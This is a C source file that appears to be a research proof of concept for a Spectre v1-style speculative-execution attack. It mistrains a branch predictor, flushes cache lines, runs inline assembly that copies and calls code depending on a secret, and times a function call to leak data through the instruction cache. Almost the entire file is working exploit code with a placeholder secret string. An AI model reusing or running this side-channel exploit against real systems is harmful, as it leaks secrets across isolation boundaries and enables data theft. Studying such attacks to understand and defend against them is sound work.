#include <stdio.h>
#include <stdint.h> 
#include <stdlib.h>
#include <fcntl.h>
#include <linux/types.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <inttypes.h>
#include <errno.h>
#include <string.h>
#include <stdbool.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#include "dummy.h"
#define L1_BLOCK_SZ_BYTES   64
#define TRAIN_TIMES         1023 
#define ROUNDS              1    // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS  10   // amount of times to attack the same index
#define SECRET_SZ           19
#define CACHE_HIT_THRESHOLD 79
// #define RCX 0
#define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
uint64_t array1_sz = 16;
uint64_t check = 1;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char*   secretString = "PASSWORD_SPECTRE_V1";
int secret;
int test=1;

static inline uint64_t start_time(void)
{
	uint64_t t;
	asm volatile(
		"lfence\n\t"
		"rdtsc\n\t"
		"shl $32, %%rdx\n\t"
		"or %%rdx, %0\n\t"
		"lfence"
		: "=a"(t) /*output*/
		:
		: "rdx", "memory", "cc");
	return t;
}

/**
 * This function is modified from:
 *  https://github.com/google/highwayhash/blob/master/highwayhash/tsc_timer.h
 */
static inline uint64_t stop_time(void)
{
	uint64_t t;
	asm volatile(
		"rdtscp\n\t"
		"shl $32, %%rdx\n\t"
		"or %%rdx, %0\n\t"
		"lfence"
		: "=a"(t) /*output*/
		:
		: "rcx", "rdx", "memory", "cc");
	return t;
}


void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    outValArray[0] = 0; outValArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0]; outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

int temp,acc;
void victimFunc(uint64_t idx) {
    //  printf("secret idx %d \n",idx);
     volatile unsigned int *arr = &array2[0*L1_BLOCK_SZ_BYTES];
     volatile unsigned int *s = &secret;
     volatile unsigned int *t = &test;
     volatile unsigned int *b = &idx;
     volatile unsigned int *src = &array2[127*L1_BLOCK_SZ_BYTES];
     
    //  volatile unsigned int *dest = &array2[1*L1_BLOCK_SZ_BYTES];
     unsigned int *c = &array1_sz;
    //  temp &= array2[1* L1_BLOCK_SZ_BYTES];
    //  temp &= array2[0 * L1_BLOCK_SZ_BYTES];
    // temp &= secret;
     _mm_clflush(&array1_sz);
    // volatile unsigned int rcx;
    // printf("%d\n",effSec);
    BARRIER 
    asm volatile(
    R"(
      # Pointer chase *b to delay branch resolution
      movl (%0), %%r11d
      clflush (%1)
      mfence
      lfence
      movl (%1), %%eax
      cmp %%r11d, %%eax
      jbe done
      movl     (%2),%%ebx
      mov     %6,%%rdx 
      mov     $4,%%rcx   
      mov     $0,%%r10d
      cmp     %%ebx,%%r10d
      cmovne  %%rdx, %%rcx
      mov %4,%%rsi 
      mov %3,%%rdi
      rep movsb
      call dummy 
      
    //  movl (%5),%%r9d
       
      done: 
            nop
    )"
    : "+r"(b), "+r"(c), "+r"(s), "+r"(arr),"+r"(src),"+r"(t)
    : "i"(RCX)
    : "%r11", "%r15","%r10","%rcx", "%eax", "%ebx", "%ecx", "%rdx", "memory"
    );


    
    
}

int main(void) {
    uint64_t attackIdx = 40;
    uint64_t start, diff, passInIdx, randIdx,effIdx,effSec;
    // uint8_t dummy = 0;
    static uint64_t results[256];
    int key=23;

    // int key = atoi(argv[1]);
    // printf("secret%d\n",key);

    for(uint64_t bit = 0; bit <20; ++bit) {
        int junk = 0;
        int train = 0;
        register uint64_t time1, time2;
        volatile uint8_t *addr;
         
        secret = 1;

        // printf("secret%d\n",secret);

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                randIdx = 3;
             for (int tt =0; tt <256*L1_BLOCK_SZ_BYTES; tt++){
                _mm_clflush(&array2[tt]);
            }

                
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                effIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
                 _mm_clflush(&dummy); 
                BARRIER 
                for(uint64_t k = 0; k < 1023; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                // call function to tsrain or attack
                victimFunc(effIdx);
            }
                /*exploit icache*/
                uint64_t access_time2 = start_time();
                dummy();
                uint64_t start = stop_time() - access_time2;

                     printf("got time %lu \n", start);
    }

    return 0;
}
